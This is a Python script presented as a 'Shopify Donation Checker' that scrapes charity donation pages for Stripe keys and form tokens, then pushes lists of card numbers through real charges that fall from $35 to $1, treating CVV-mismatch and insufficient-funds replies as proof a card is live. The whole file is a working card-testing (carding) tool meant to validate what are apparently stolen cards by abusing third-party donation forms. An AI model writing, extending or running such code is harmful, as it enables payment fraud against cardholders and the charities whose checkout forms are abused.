#!/usr/bin/env python3
"""
Shopify Donation Checker - Like Mady but for Shopify
Implements actual charge logic with exponential backoff
"""

import requests
import re
import time
import json
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table
from rich import box
from bs4 import BeautifulSoup
from typing import Dict, Tuple, Optional, List

console = Console()

# Exponential backoff amounts
BACKOFF_AMOUNTS = [35.00, 25.00, 14.99, 4.99, 2.00, 1.00]  # Added $1 failsafe

# Theme
THEME = {
    'success': '#34D399',
    'error': '#F87171',
    'warning': '#FBBF24',
    'info': '#93C5FD',
    'primary': '#A78BFA',
}


def fetch_donation_page_data(url: str) -> Tuple[Optional[str], Optional[Dict]]:
    """
    Fetch donation page and extract Stripe key + form data
    Like fetch_nonce_and_form_id() in Mady
    """
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code != 200:
            return None, None
        
        page_content = response.text
        soup = BeautifulSoup(page_content, 'html.parser')
        
        # Find Stripe publishable key
        stripe_key_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', page_content)
        stripe_key = stripe_key_match.group(0) if stripe_key_match else None
        
        # Extract form data
        form_data = {}
        
        # Find form
        form = soup.find('form')
        if form:
            # Get action URL
            action = form.get('action', '')
            if action:
                if action.startswith('http'):
                    form_data['submit_url'] = action
                elif action.startswith('/'):
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    form_data['submit_url'] = f"{parsed.scheme}://{parsed.netloc}{action}"
                else:
                    form_data['submit_url'] = url
            else:
                form_data['submit_url'] = url
            
            # Find hidden inputs (nonce, tokens, form IDs)
            for input_tag in form.find_all('input', {'type': 'hidden'}):
                name = input_tag.get('name')
                value = input_tag.get('value')
                if name and value:
                    form_data[name] = value
        
        # Look for common field names
        nonce_input = soup.find('input', {'name': re.compile(r'nonce|token|csrf', re.I)})
        if nonce_input:
            form_data['nonce'] = nonce_input.get('value')
        
        form_id_input = soup.find('input', {'name': re.compile(r'form.*id', re.I)})
        if form_id_input:
            form_data['form_id'] = form_id_input.get('value')
        
        return stripe_key, form_data
        
    except Exception as e:
        console.print(f"[{THEME['error']}]Error fetching page: {e}")
        return None, None


def create_stripe_payment_method(card_data: str, stripe_key: str, gate_url: str) -> Optional[str]:
    """
    Create Stripe payment method - EXACT logic from Mady
    """
    try:
        n, mm, yy, cvc = card_data.split('|')
        yy = yy[-2:]
        
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        stripe_data = (
            f"type=card"
            f"&billing_details[name]=Test Donor"
            f"&billing_details[email]=donor@example.com"
            f"&billing_details[address][line1]=123 Test St"
            f"&billing_details[address][postal_code]=10001"
            f"&card[number]={n}"
            f"&card[cvc]={cvc}"
            f"&card[exp_month]={mm}"
            f"&card[exp_year]={yy}"
            f"&key={stripe_key}"
        )
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=15
        )
        
        if response.status_code != 200:
            return None
        
        pm_data = response.json()
        
        if 'error' in pm_data:
            return None
        
        if 'id' in pm_data:
            return pm_data['id']
        
        return None
        
    except Exception as e:
        return None


def submit_donation(payment_method_id: str, amount: float, form_data: Dict, gate_url: str) -> Tuple[bool, str]:
    """
    Submit actual donation - Like donation submission in Mady
    """
    try:
        submit_url = form_data.get('submit_url', gate_url)
        
        headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': gate_url,
            'referer': gate_url,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # Build donation data
        donation_data = {
            'payment_method': payment_method_id,
            'stripe_payment_method': payment_method_id,
            'amount': str(amount),
            'donation_amount': str(amount),
            'custom_donation_amount': str(amount),
            'email': 'donor@example.com',
            'first_name': 'Test',
            'last_name': 'Donor',
            'name': 'Test Donor',
            'address': '123 Test St',
            'postcode': '10001',
            'gateway': 'stripe',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        # Add form-specific fields
        for key, value in form_data.items():
            if key not in ['submit_url']:
                donation_data[key] = value
        
        response = requests.post(
            submit_url,
            headers=headers,
            data=donation_data,
            timeout=15
        )
        
        response_text = response.text.lower()
        
        # Analyze response - EXACT logic from Mady's analyze_response()
        # Full success
        if 'requires_action' in response_text or 'success":true' in response_text or 'thank you' in response_text:
            return True, "CHARGED"
        
        # CVV mismatch (card valid)
        cvv_indicators = [
            'incorrect_cvc', 'invalid_cvc', 'incorrect cvc', 'invalid cvc',
            'security code is incorrect', 'security code is invalid',
            'cvv is incorrect', 'cvc is incorrect',
            "card's security code is incorrect",
            'check the card', 'check card details'
        ]
        
        for indicator in cvv_indicators:
            if indicator in response_text:
                return True, "CVV_MISMATCH"
        
        # Insufficient funds (card valid)
        if 'insufficient funds' in response_text or 'insufficient_funds' in response_text:
            return True, "INSUFFICIENT_FUNDS"
        
        # Try parsing JSON
        try:
            response_json = json.loads(response.text)
            
            if 'errors' in response_json:
                errors = response_json['errors']
                error_text = ' '.join(errors) if isinstance(errors, list) else str(errors)
                error_lower = error_text.lower()
                
                for indicator in cvv_indicators:
                    if indicator in error_lower:
                        return True, "CVV_MISMATCH"
                
                if 'insufficient funds' in error_lower:
                    return True, "INSUFFICIENT_FUNDS"
            
            if 'message' in response_json:
                message_lower = response_json['message'].lower()
                
                for indicator in cvv_indicators:
                    if indicator in message_lower:
                        return True, "CVV_MISMATCH"
                
                if 'insufficient funds' in message_lower:
                    return True, "INSUFFICIENT_FUNDS"
        except:
            pass
        
        # Declined
        return False, "DECLINED"
        
    except Exception as e:
        return False, f"ERROR: {str(e)[:50]}"


def check_card_on_gate(card_data: str, gate: Dict) -> Tuple[bool, float, str]:
    """
    Check card on gate with exponential backoff
    Returns: (success, amount, status)
    Like check_card() in Mady but with backoff
    """
    gate_url = gate['url']
    
    # Step 1: Fetch page data (like fetch_nonce_and_form_id)
    stripe_key, form_data = fetch_donation_page_data(gate_url)
    
    if not stripe_key:
        return False, 0, "NO_STRIPE_KEY"
    
    if not form_data:
        return False, 0, "NO_FORM_DATA"
    
    # Step 2: Try each amount with backoff
    for amount in BACKOFF_AMOUNTS:
        console.print(f"  [cyan]Trying ${amount:.2f}...[/cyan]", end=" ")
        
        # Create payment method (like Mady)
        payment_method_id = create_stripe_payment_method(card_data, stripe_key, gate_url)
        
        if not payment_method_id:
            console.print(f"[red]✗ PM creation failed[/red]")
            continue
        
        # Submit donation (like Mady)
        success, status = submit_donation(payment_method_id, amount, form_data, gate_url)
        
        if success:
            console.print(f"[green]✓ {status}![/green]")
            return True, amount, status
        else:
            console.print(f"[red]✗ {status}[/red]")
        
        time.sleep(2)  # Delay between amounts
    
    # All amounts failed
    return False, 0, "DECLINED"


def check_card_on_gates(card_data: str, gates: List[Dict]) -> List[Dict]:
    """
    Check card on multiple gates
    Returns list of successful gates with amounts
    """
    results = []
    
    console.print(f"\n[bold cyan]Testing card: {card_data[:6]}...{card_data[-3:]}[/bold cyan]\n")
    
    for i, gate in enumerate(gates, 1):
        console.print(f"[yellow]Gate {i}/{len(gates)}: {gate['url']}[/yellow]")
        
        success, amount, status = check_card_on_gate(card_data, gate)
        
        if success:
            result = {
                'gate': gate['url'],
                'amount': amount,
                'status': status,
                'card': card_data
            }
            results.append(result)
            
            # Report success
            console.print(f"[bold green]✅ Success ${amount:.2f} Shopify - {status}[/bold green]\n")
        else:
            console.print(f"[red]❌ Declined on this gate[/red]\n")
        
        time.sleep(3)  # Delay between gates
    
    return results


def main():
    """Main checker function"""
    console.clear()
    
    header = Panel(
        "[bold]🛍️ Shopify Donation Checker[/bold]\n[dim]Like Mady but for Shopify gates[/dim]",
        style=f"bold {THEME['primary']}",
        box=box.DOUBLE
    )
    console.print(header)
    
    # Load donation gates
    if not os.path.exists('donation_gates.json'):
        console.print(f"[{THEME['error']}]✗ donation_gates.json not found!")
        console.print(f"[{THEME['info']}]Run gate_analyzer.py first to find donation sites")
        return
    
    with open('donation_gates.json', 'r') as f:
        gates = json.load(f)
    
    console.print(f"[{THEME['success']}]✓ Loaded {len(gates)} donation gates\n")
    
    # Get cards
    use_custom = console.input("[cyan]Use custom cards? (y/n): [/]").lower()
    
    cards = []
    if use_custom == 'y':
        console.print("\n[yellow]Enter cards (format: number|month|year|cvv)[/yellow]")
        console.print("[yellow]Press Enter on empty line when done[/yellow]\n")
        
        while True:
            card = console.input("Card: ").strip()
            if not card:
                break
            if '|' in card and len(card.split('|')) == 4:
                cards.append(card)
                console.print(f"[green]✓ Added: {card[:6]}...{card[-3:]}[/green]")
            else:
                console.print("[red]✗ Invalid format[/red]")
    else:
        # Use test cards
        cards = [
            "4532015112830366|12|2027|123",
            "5425233430109903|11|2026|456",
        ]
        console.print(f"[green]✓ Using {len(cards)} test cards[/green]")
    
    if not cards:
        console.print("[red]No cards to test[/red]")
        return
    
    # Ask how many gates to test
    console.print(f"\n[yellow]Total gates: {len(gates)}[/yellow]")
    try:
        max_gates = int(console.input("[cyan]How many gates to test? (default: all): [/]") or str(len(gates)))
        max_gates = min(max_gates, len(gates))
    except:
        max_gates = len(gates)
    
    gates_to_test = gates[:max_gates]
    
    console.print(f"\n[green]✓ Will test {len(cards)} card(s) on {len(gates_to_test)} gate(s)[/green]")
    console.print(f"[yellow]Strategy: ${BACKOFF_AMOUNTS[0]:.2f} → ${BACKOFF_AMOUNTS[1]:.2f} → ${BACKOFF_AMOUNTS[2]:.2f} → ${BACKOFF_AMOUNTS[3]:.2f} → ${BACKOFF_AMOUNTS[4]:.2f} → ${BACKOFF_AMOUNTS[5]:.2f}[/yellow]\n")
    
    proceed = console.input("[cyan]Proceed? (y/n): [/]").lower()
    if proceed != 'y':
        return
    
    # Check each card
    all_results = []
    
    for card in cards:
        results = check_card_on_gates(card, gates_to_test)
        all_results.extend(results)
    
    # Display final results
    console.print("\n" + "="*60)
    console.print("[bold green]✅ FINAL RESULTS[/bold green]")
    console.print("="*60 + "\n")
    
    if all_results:
        # Group by amount
        by_amount = {}
        for result in all_results:
            amount = result['amount']
            if amount not in by_amount:
                by_amount[amount] = []
            by_amount[amount].append(result)
        
        # Display by amount
        for amount in sorted(by_amount.keys(), reverse=True):
            results_at_amount = by_amount[amount]
            console.print(f"[bold yellow]${amount:.2f} Gates ({len(results_at_amount)} found):[/bold yellow]")
            
            for result in results_at_amount:
                console.print(f"  [green]✓ {result['gate']}[/green]")
                console.print(f"    Card: {result['card'][:6]}...{result['card'][-3:]}")
                console.print(f"    Status: {result['status']}\n")
        
        # Save results
        with open('checker_results.json', 'w') as f:
            json.dump(all_results, f, indent=2)
        
        console.print(f"[{THEME['success']}]✓ Results saved to checker_results.json")
    else:
        console.print("[red]❌ No successful charges found[/red]")
        console.print("[yellow]All cards declined on all gates[/yellow]")


if __name__ == "__main__":
    import os
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"\n[red]Error: {e}[/red]")
